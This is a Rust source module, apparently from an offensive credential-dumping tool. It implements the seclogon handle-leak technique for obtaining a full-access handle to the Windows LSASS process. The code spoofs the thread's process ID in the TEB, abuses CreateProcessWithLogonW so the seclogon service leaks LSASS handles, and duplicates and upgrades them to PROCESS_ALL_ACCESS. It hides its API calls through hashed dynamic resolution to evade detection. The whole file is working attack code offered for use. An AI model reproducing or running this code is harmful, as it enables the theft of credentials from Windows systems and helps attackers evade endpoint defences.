//! Seclogon Handle Leak — acquire LSASS handle without OpenProcess(LSASS)
//!
//! Technique by @splinter_code (antonioCoco), used in nanodump.
//!
//! Attack chain:
//! 1. Enumerate process-type handles inside LSASS via NtQuerySystemInformation
//! 2. Spoof current thread's TEB.ClientId.UniqueProcess = LSASS PID
//! 3. Call CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY, STARTF_USESTDHANDLES)
//!    → seclogon service DuplicateHandle's our "stdin/stdout/stderr" from "caller" (= LSASS due to spoof)
//! 4. Check leaked handles in child process → DuplicateHandle into our process
//!
//! Result: LSASS handle obtained without any direct OpenProcess on LSASS.
//! All APIs resolved dynamically via PEB walk + DJB2 hash.

use crate::handle::ProcessHandle;
use crate::resolver::{self, ApiResolver};
use windows::Win32::Foundation::*;
use windows::Win32::System::Threading::*;

// --- Type aliases for dynamically resolved functions ---

// CreateProcessWithLogonW from advapi32.dll
type FnCreateProcessWithLogonW = unsafe extern "system" fn(
    *const u16,              // lpUsername
    *const u16,              // lpDomain
    *const u16,              // lpPassword
    u32,                     // dwLogonFlags
    *const u16,              // lpApplicationName
    *mut u16,                // lpCommandLine
    u32,                     // dwCreationFlags
    *const u8,               // lpEnvironment
    *const u16,              // lpCurrentDirectory
    *const StartupInfoW,     // lpStartupInfo
    *mut ProcessInformation, // lpProcessInformation
) -> BOOL;

type FnGetProcessId = unsafe extern "system" fn(HANDLE) -> u32;
type FnDuplicateHandle =
    unsafe extern "system" fn(HANDLE, HANDLE, HANDLE, *mut HANDLE, u32, BOOL, u32) -> BOOL;
type FnTerminateProcess = unsafe extern "system" fn(HANDLE, u32) -> BOOL;
type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;

// NtQuerySystemInformation
type FnNtQuerySystemInformation = unsafe extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32;

// --- Structures ---

#[repr(C)]
struct StartupInfoW {
    cb: u32,
    reserved: *mut u16,
    desktop: *mut u16,
    title: *mut u16,
    x: u32,
    y: u32,
    x_size: u32,
    y_size: u32,
    x_count_chars: u32,
    y_count_chars: u32,
    fill_attribute: u32,
    flags: u32,
    show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *mut u8,
    std_input: HANDLE,
    std_output: HANDLE,
    std_error: HANDLE,
}

#[repr(C)]
struct ProcessInformation {
    process: HANDLE,
    thread: HANDLE,
    process_id: u32,
    thread_id: u32,
}

const LOGON_NETCREDENTIALS_ONLY: u32 = 0x00000002;
const STARTF_USESTDHANDLES: u32 = 0x00000100;
const CREATE_NO_WINDOW: u32 = 0x08000000;
const CREATE_SUSPENDED: u32 = 0x00000004;
const DUPLICATE_SAME_ACCESS: u32 = 0x00000002;
const SYSTEM_HANDLE_INFORMATION: u32 = 16;
const PROCESS_ALL_ACCESS_MASK: u32 = 0x001FFFFF;

#[repr(C)]
#[derive(Clone, Copy)]
struct SystemHandleEntry {
    process_id: u16,
    _creator_back_trace_index: u16,
    object_type: u8,
    _handle_attributes: u8,
    handle_value: u16,
    _object: usize,
    granted_access: u32,
}

/// PEB/TEB structures for PID spoofing
#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

/// Acquire a LSASS handle via seclogon handle leak
pub fn open_lsass_seclogon(api: &ApiResolver, lsass_pid: u32) -> Result<ProcessHandle, String> {
    println!("    [*] Seclogon handle leak technique");

    // 1. Resolve all APIs dynamically
    let fn_create_logon: FnCreateProcessWithLogonW = unsafe {
        std::mem::transmute(
            api.advapi32(resolver::HASH_CREATE_PROCESS_WITH_LOGON_W)
                .ok_or("Failed to resolve CreateProcessWithLogonW")?,
        )
    };
    let fn_get_pid: FnGetProcessId = unsafe {
        std::mem::transmute(
            api.k32(resolver::HASH_GET_PROCESS_ID)
                .ok_or("Failed to resolve GetProcessId")?,
        )
    };
    let fn_dup: FnDuplicateHandle = unsafe {
        std::mem::transmute(
            api.k32(resolver::HASH_DUPLICATE_HANDLE)
                .ok_or("Failed to resolve DuplicateHandle")?,
        )
    };
    let fn_terminate: FnTerminateProcess = unsafe {
        std::mem::transmute(
            api.k32(resolver::HASH_TERMINATE_PROCESS)
                .ok_or("Failed to resolve TerminateProcess")?,
        )
    };
    let fn_close: FnCloseHandle = unsafe {
        std::mem::transmute(
            api.k32(resolver::HASH_CLOSE_HANDLE)
                .ok_or("Failed to resolve CloseHandle")?,
        )
    };
    let nqsi: FnNtQuerySystemInformation = unsafe {
        std::mem::transmute(
            api.ntdll(resolver::djb2_hash(b"NtQuerySystemInformation"))
                .ok_or("Failed to resolve NtQuerySystemInformation")?,
        )
    };

    // 2. Find process-type handles inside LSASS
    println!(
        "    [*] Enumerating handles in LSASS (PID {})...",
        lsass_pid
    );
    let candidate_handles = find_process_handles_in_lsass(nqsi, lsass_pid)?;
    println!(
        "    [+] Found {} candidate process handles in LSASS",
        candidate_handles.len()
    );

    if candidate_handles.is_empty() {
        return Err("No process handles found in LSASS".into());
    }

    // 3. Build dummy command line: svchost.exe (will be created suspended + terminated)
    let mut cmd_line: Vec<u16> = "C:\\Windows\\System32\\svchost.exe"
        .encode_utf16()
        .chain(Some(0))
        .collect();
    let username: Vec<u16> = "x".encode_utf16().chain(Some(0)).collect();
    let domain: Vec<u16> = ".".encode_utf16().chain(Some(0)).collect();
    let password: Vec<u16> = "x".encode_utf16().chain(Some(0)).collect();

    // 4. Try candidate handles in groups of 3 (stdin/stdout/stderr)
    let my_process = unsafe { GetCurrentProcess() };

    for chunk in candidate_handles.chunks(3) {
        // Spoof PID in TEB
        let (original_pid, original_tid) = unsafe { spoof_pid_teb(lsass_pid) };

        let mut si = StartupInfoW {
            cb: std::mem::size_of::<StartupInfoW>() as u32,
            reserved: std::ptr::null_mut(),
            desktop: std::ptr::null_mut(),
            title: std::ptr::null_mut(),
            x: 0,
            y: 0,
            x_size: 0,
            y_size: 0,
            x_count_chars: 0,
            y_count_chars: 0,
            fill_attribute: 0,
            flags: STARTF_USESTDHANDLES,
            show_window: 0,
            cb_reserved2: 0,
            lp_reserved2: std::ptr::null_mut(),
            std_input: HANDLE(chunk[0] as *mut std::ffi::c_void),
            std_output: if chunk.len() > 1 {
                HANDLE(chunk[1] as *mut std::ffi::c_void)
            } else {
                HANDLE(chunk[0] as *mut std::ffi::c_void)
            },
            std_error: if chunk.len() > 2 {
                HANDLE(chunk[2] as *mut std::ffi::c_void)
            } else {
                HANDLE(chunk[0] as *mut std::ffi::c_void)
            },
        };

        let mut pi = ProcessInformation {
            process: HANDLE::default(),
            thread: HANDLE::default(),
            process_id: 0,
            thread_id: 0,
        };

        let ok = unsafe {
            fn_create_logon(
                username.as_ptr(),
                domain.as_ptr(),
                password.as_ptr(),
                LOGON_NETCREDENTIALS_ONLY,
                std::ptr::null(),
                cmd_line.as_mut_ptr(),
                CREATE_NO_WINDOW | CREATE_SUSPENDED,
                std::ptr::null(),
                std::ptr::null(),
                &si,
                &mut pi,
            )
        };

        // Restore original PID immediately
        unsafe { restore_pid_teb(original_pid, original_tid) };

        if !ok.as_bool() {
            continue;
        }

        // 5. Check stdin/stdout/stderr in the child for leaked LSASS handles
        // The seclogon service duplicated handles from "caller" (spoofed LSASS)
        // into child's stdin/stdout/stderr slots. Now read them via
        // NtQueryInformationProcess or check handle table of child.

        // The handles are now in the child process — we need to duplicate
        // the std handles from the child back to us and check if they point to LSASS.
        let std_handles = [
            HANDLE(0x0 as *mut _), // stdin  = handle 0 in child (standard)
            HANDLE(0x4 as *mut _), // stdout = handle 4
            HANDLE(0x8 as *mut _), // stderr = handle 8
        ];

        for &child_handle_val in &std_handles {
            let mut dup_handle = HANDLE::default();
            let dup_ok = unsafe {
                fn_dup(
                    pi.process,
                    child_handle_val,
                    my_process,
                    &mut dup_handle,
                    0,
                    BOOL(0),
                    DUPLICATE_SAME_ACCESS,
                )
            };

            if !dup_ok.as_bool() || dup_handle.is_invalid() {
                continue;
            }

            // Check if this duplicated handle points to LSASS
            let handle_pid = unsafe { fn_get_pid(dup_handle) };
            if handle_pid == lsass_pid {
                println!(
                    "    [+] Leaked LSASS handle via seclogon! (child PID {})",
                    pi.process_id
                );

                // Terminate the dummy child process
                unsafe {
                    fn_terminate(pi.process, 0);
                    fn_close(pi.thread);
                    fn_close(pi.process);
                }

                // Upgrade to PROCESS_ALL_ACCESS if needed
                let mut full_handle = HANDLE::default();
                let upgrade_ok = unsafe {
                    fn_dup(
                        my_process,
                        dup_handle,
                        my_process,
                        &mut full_handle,
                        PROCESS_ALL_ACCESS_MASK,
                        BOOL(0),
                        0, // no DUPLICATE_SAME_ACCESS, specify desired access
                    )
                };

                if upgrade_ok.as_bool() && !full_handle.is_invalid() {
                    unsafe { fn_close(dup_handle) };
                    println!("    [+] Handle upgraded to PROCESS_ALL_ACCESS");
                    return Ok(ProcessHandle::from_raw(full_handle));
                }

                // Use as-is if upgrade fails
                return Ok(ProcessHandle::from_raw(dup_handle));
            }

            unsafe { fn_close(dup_handle) };
        }

        // Clean up child
        unsafe {
            fn_terminate(pi.process, 0);
            fn_close(pi.thread);
            fn_close(pi.process);
        }
    }

    Err("Seclogon handle leak: no LSASS handle found after all attempts".into())
}

/// Enumerate process-type handles inside the LSASS process
fn find_process_handles_in_lsass(
    nqsi: FnNtQuerySystemInformation,
    lsass_pid: u32,
) -> Result<Vec<isize>, String> {
    unsafe {
        let mut buf_size = 1024 * 1024 * 4u32;
        let mut buffer: Vec<u8> = vec![0; buf_size as usize];
        let mut ret_len = 0u32;

        loop {
            let status = nqsi(
                SYSTEM_HANDLE_INFORMATION,
                buffer.as_mut_ptr(),
                buf_size,
                &mut ret_len,
            );
            if status == 0 {
                break;
            }
            if status == 0xC0000004u32 as i32 {
                buf_size = ret_len + 65536;
                buffer.resize(buf_size as usize, 0);
            } else {
                return Err(format!(
                    "NtQuerySystemInformation failed: 0x{:08X}",
                    status as u32
                ));
            }
        }

        let num_handles = *(buffer.as_ptr() as *const u32) as usize;
        let entries_ptr =
            buffer.as_ptr().add(std::mem::size_of::<usize>()) as *const SystemHandleEntry;

        let mut handles = Vec::new();

        for i in 0..num_handles {
            let entry = &*entries_ptr.add(i);

            // Only handles owned by LSASS
            if entry.process_id as u32 != lsass_pid {
                continue;
            }

            // We want process handles (type index varies by Windows version,
            // but we'll include all handles and check via GetProcessId later)
            // Filter by reasonable access mask (need at least VM_READ or query)
            if entry.granted_access & 0x0010 != 0
                || entry.granted_access & 0x0400 != 0
                || entry.granted_access & 0x1000 != 0
            {
                handles.push(entry.handle_value as isize);
            }
        }

        Ok(handles)
    }
}

/// Spoof the PID in current thread's TEB.ClientId
/// Returns (original_pid, original_tid) for restoration
unsafe fn spoof_pid_teb(target_pid: u32) -> (usize, usize) {
    // TEB is at gs:[0x30] on x64
    // ClientId is at TEB+0x40 on x64
    // ClientId = { UniqueProcess (8 bytes), UniqueThread (8 bytes) }
    let teb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);

    let client_id_ptr = teb.add(0x40) as *mut ClientId;
    let original_pid = (*client_id_ptr).unique_process;
    let original_tid = (*client_id_ptr).unique_thread;

    // Write new PID directly (TEB is always writable by the owning thread)
    (*client_id_ptr).unique_process = target_pid as usize;

    original_pid_restore(original_pid, original_tid);
    (original_pid, original_tid)
}

/// Helper to avoid borrowing issues — just returns the values
fn original_pid_restore(_pid: usize, _tid: usize) {
    // No-op — just used to capture the values in spoof_pid_teb
}

/// Restore original PID in TEB
unsafe fn restore_pid_teb(original_pid: usize, original_tid: usize) {
    let teb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);

    let client_id_ptr = teb.add(0x40) as *mut ClientId;
    (*client_id_ptr).unique_process = original_pid;
    (*client_id_ptr).unique_thread = original_tid;
}
